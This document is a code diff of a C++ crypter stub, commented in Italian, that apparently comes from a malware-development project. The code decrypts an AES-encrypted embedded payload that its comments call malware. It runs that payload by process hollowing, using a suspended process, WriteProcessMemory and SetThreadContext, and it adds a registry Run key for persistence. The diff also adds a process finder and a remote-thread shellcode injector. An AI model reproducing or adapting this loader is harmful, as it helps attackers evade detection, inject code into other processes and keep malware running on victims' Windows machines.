@@ -8,6 +8,8 @@
 #pragma comment (lib, "advapi32")
 #include <psapi.h>
 #include <fstream>
+#include <tlhelp32.h>
+
 
 
 int AESDecrypt(unsigned char * payload, unsigned int payload_len, char * key, size_t keylen) {
@@ -69,36 +71,62 @@ unsigned char *GetResource(int resourceId, char* resourceString, unsigned long* 
   DWORD  dwThreadId;
 } PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;*/
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    //FreeConsole(); //questo per nascondere la console mentre lo stub viene eseguito
-    unsigned long malwareLen;
-    unsigned long keyLen;
+int FindTarget(const char *procname) {
 
-    unsigned char* key;
+        HANDLE hProcSnap;
+        PROCESSENTRY32 pe32;
+        int pid = 0;
+                
+        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
+                
+        pe32.dwSize = sizeof(PROCESSENTRY32); 
+                
+        if (!Process32First(hProcSnap, &pe32)) {
+                CloseHandle(hProcSnap);
+                return 0;
+        }
+                
+        while (Process32Next(hProcSnap, &pe32)) {
+                if (lstrcmpiA(procname, (LPCSTR)pe32.szExeFile) == 0) {
+                        pid = pe32.th32ProcessID;
+                        break;
+                }
+        }
+                
+        CloseHandle(hProcSnap);
+                
+        return pid;
+}
 
-    //69 e' l' ID che ho assegnato in crypter_mio.cpp, BIN e' il tipo di risorsa, malwareLen e' la grandezza del malware(pass by reference)
-    unsigned char* resourcePtr = GetResource(69, "BIN", &malwareLen); 
-    key = GetResource(420,"BIN", &keyLen);
+int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
 
-    for(int i = 0; i< 32; i++){
-        printf("%x\n", key[i]);
-    }
-    unsigned char* malware = new unsigned char[malwareLen]; //alloco memoria per il malware
-    memcpy(malware, resourcePtr, malwareLen); //copio il malware nelle risorse nella memoria allocata per il malware
-    printf("%d",malwareLen);
+        LPVOID pRemoteCode = NULL;
+        HANDLE hThread = NULL;
 
-    AESDecrypt(malware, malwareLen, (char *)key, 32); //decrypto il malware e lo salvo in pe
+  
+        pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+        WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
+        
+        hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
+        if (hThread != NULL) {
+                WaitForSingleObject(hThread, 500);
+                CloseHandle(hThread);
+                return 0;
+        }
+        return -1;
+}
 
-    void* pe = malware; // pe sara' il puntatore ai byte del nostro malware
-    Sleep(1500);
-    for(int i = 0; i < 2000; i++){
-        printf("%c", malware[i]);
-    }
-    Sleep(3000);
-    //Adesso arriva la roba strana del RunPE
 
-    printf("prima degli header");
 
+void RunPE_proc(void *pe, const char* procname){
+}
+
+void RunPE_self(void* pe){
+
+
+
+    char currentFilePath[1024];
 
     IMAGE_DOS_HEADER* DOSHeader; // DOS header ovvero i primi 64 byte del nostro malware e primo header del PE
     IMAGE_NT_HEADERS64* NtHeader; // NT header ovvero i successivi 248 byte del nostro malware e secondo header del PE
@@ -107,10 +135,13 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     PROCESS_INFORMATION PI; // struct che contiene informazioni sul processo che creeremo
     STARTUPINFOA SI;    // it is a struct that specifies the window station, desktop, standard handles, and appearance of the main window for a process at creation time.
 
+    CONTEXT* CTX; // struct che contiene i registri del processo che vogliamo attaccare
+
+
     void* pImageBase; //puntatore all' inizio dell' immagine eseguibile(letteralmente il file .exe) del processo che vogliamo attaccarE
+
 ////////////////////////
-    char currentFilePath[1024]; // path del file .exe che stiamo eseguendo INSERIRE IL PATH AD UN EXE TIPO NOTEPAD.EXE
-/////////////////////////
+///////////////////////// 
     DOSHeader = PIMAGE_DOS_HEADER(pe);   // assegno a DOSHeader il puntatore al DOSHeader
     NtHeader = PIMAGE_NT_HEADERS64(DWORD64(pe) + DOSHeader->e_lfanew);  // assegno a NtHeader il puntatore al NtHeader calcolandolo
     // come indirizzo del DOS header + e_lfanew che sarebbe l' offset del NT header rispetto all' inizio del DOS header
@@ -132,10 +163,23 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         ZeroMemory(&SI, sizeof(SI));
         //al posto di NULL posso specificare il path di un altro file .exe valido come ad esempio notepad.exe
         printf("\nPRIMA GetModuleFileNameA");
-        Sleep(3000);          
+        Sleep(3000);  
         GetModuleFileNameA(NULL,currentFilePath,sizeof(currentFilePath)); //prendo il path del file .exe che sto eseguendo
         printf("\n\nDOPO GetModuleFileNameA");
-        Sleep(3000);
+        Sleep(3000);     
+        /*BOOL CreateProcessA(
+            [in, optional]      LPCSTR                lpApplicationName,
+            [in, out, optional] LPSTR                 lpCommandLine,
+            [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
+            [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
+            [in]                BOOL                  bInheritHandles,
+            [in]                DWORD                 dwCreationFlags,
+            [in, optional]      LPVOID                lpEnvironment,
+            [in, optional]      LPCSTR                lpCurrentDirectory,
+            [in]                LPSTARTUPINFOA        lpStartupInfo,
+            [out]               LPPROCESS_INFORMATION lpProcessInformation
+        );*/
+        //creo processo in stato sospeso e salvo i valori nelle struct SI e PI
         if(TRUE){  //AGGIUNGERE argomento da linea di comando
             printf("\n creating Registry Run KEY \n"); //rendo il processo persistent
             HKEY hkey = NULL;
@@ -150,23 +194,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
                 RegCloseKey(hkey);
             }     
         }
-        /*BOOL CreateProcessA(
-            [in, optional]      LPCSTR                lpApplicationName,
-            [in, out, optional] LPSTR                 lpCommandLine,
-            [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
-            [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
-            [in]                BOOL                  bInheritHandles,
-            [in]                DWORD                 dwCreationFlags,
-            [in, optional]      LPVOID                lpEnvironment,
-            [in, optional]      LPCSTR                lpCurrentDirectory,
-            [in]                LPSTARTUPINFOA        lpStartupInfo,
-            [out]               LPPROCESS_INFORMATION lpProcessInformation
-        );*/
-        //creo processo in stato sospeso e salvo i valori nelle struct SI e PI
+        if (CreateProcessA((char*)currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED , NULL, NULL, &SI, &PI)) {
 
-        if (CreateProcessA(currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
-
-            CONTEXT* CTX; // struct che contiene i registri del processo che vogliamo attaccare
             // alloco memoria per la struct CONTEXT
             CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE)); 
             CTX->ContextFlags = CONTEXT_FULL; // setto il flag della struct CONTEXT a CONTEXT_FULL per avere tutti i registri del processo che vogliamo attaccare
@@ -174,11 +203,13 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             [in]      HANDLE    hThread,
             [in, out] LPCONTEXT lpContext
             );*/
-            printf("DOPO Aver creato il processo");
+            printf("\nDOPO Aver creato il processo(Prima di GetThreadContext)");
             Sleep(3000);
             //ormai il thread si puo' accesere da PI.hThread perche 
             if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) { // prendo i registri del processo che vogliamo attaccare 
                 //VirtualAllocEx alloca memoria in un processo esterno dal corrente
+                printf("\nPrimaDi VirtualAllocEx");
+
                 pImageBase = VirtualAllocEx( // alloco memoria nel processo che vogliamo attaccare
                         PI.hProcess,
                         LPVOID(NtHeader->OptionalHeader.ImageBase),
@@ -196,6 +227,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         [in]  SIZE_T  nSize,
         [out] SIZE_T  *lpNumberOfBytesWritten
         );*/
+            printf("\nprima di WriteProcessMemory");
 
             // scrivo il mio PE malware nella memoria che ho allocato nel processo
             WriteProcessMemory(PI.hProcess, pImageBase, pe, NtHeader->OptionalHeader.SizeOfHeaders, NULL); 
@@ -248,30 +280,80 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     
                 // setto il registro Rcx del processo  all' entry point del PE malware
                 CTX->Rcx = DWORD64(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
+                printf("prima di SetThreadContext");
 
                 //setto il contesto (i registri del Process Control Bloc)
                 SetThreadContext(PI.hThread, LPCONTEXT(CTX));
-
-                HKEY hkey = NULL;
-                // malicious app
-                const char* exe = currentFilePath;
-
-                // startup
-                LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
-                if (res == ERROR_SUCCESS) {
-                    // create new registry key
-                    RegSetValueEx(hkey, (LPCSTR)"hack", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
-                    RegCloseKey(hkey);
-                }
-
                 
                 //riprendo l' esecuzione del processo (quindi eseguo il mio malware)
                 ResumeThread(PI.hThread);
 
                 WaitForSingleObject(PI.hProcess, NULL);
 
-                return 0;
             }
         }
     }
 }
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    //FreeConsole(); //questo per nascondere la console mentre lo stub viene eseguitp
+    unsigned long malwareLen;
+    unsigned long keyLen;
+
+    unsigned char* key;
+
+    //69 e' l' ID che ho assegnato in crypter_mio.cpp, BIN e' il tipo di risorsa, malwareLen e' la grandezza del malware(pass by reference)
+    unsigned char* resourcePtr = GetResource(69, "BIN", &malwareLen); 
+    key = GetResource(420,"BIN", &keyLen);
+
+    for(int i = 0; i< 32; i++){
+        printf("%x\n", key[i]);
+    }
+    unsigned char* malware = new unsigned char[malwareLen]; //alloco memoria per il malware
+    memcpy(malware, resourcePtr, malwareLen); //copio il malware nelle risorse nella memoria allocata per il malware
+    printf("%d",malwareLen);
+
+    AESDecrypt(malware, malwareLen, (char *)key, 32); //decrypto il malware e lo salvo in pe
+
+    void* pe = malware; // pe sara' il puntatore ai byte del nostro malware
+    Sleep(1500);
+    for(int i = 0; i < 2000; i++){
+        printf("%c", malware[i]);
+    }
+    Sleep(3000);
+    //Adesso arriva la roba strana del RunPE
+
+    printf("prima degli header");
+    
+    // DA AGGIUSTAREEEEEEE
+    /*char stringa1[100] = "C:\\Users\\jakyd\\Desktop\\maldev\\crypter.exe";
+    char stringa2[100] = "C:\\Users\\jakyd\\Desktop\\maldev\\crypter.exe";
+    char stringa3[100] = "C:\\Users\\jakyd\\Desktop\\maldev\\crypter.exe";
+    char currentFilePathArr[3][100]; // path del file .exe che stiamo eseguendo INSERIRE IL PATH AD UN EXE TIPO NOTEPAD.EXE
+    strcpy(currentFilePathArr[0], stringa1);
+    strcpy(currentFilePathArr[1], stringa2);
+    strcpy(currentFilePathArr[2], stringa3);
+
+    HANDLE th[3];
+
+
+    for(int i = 0; i < 3; i++){ 
+
+
+        RunPEArgs args;
+        args.pe = pe;
+        args.currentFilePath = currentFilePathArr[i];
+
+        th[i] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunPE, &args, 0, NULL);
+
+    }*/
+    //WaitForMultipleObjects(3, th, TRUE, INFINITE);
+
+
+
+    RunPE_self(pe);
+    
+
+    return 0;
+}
+
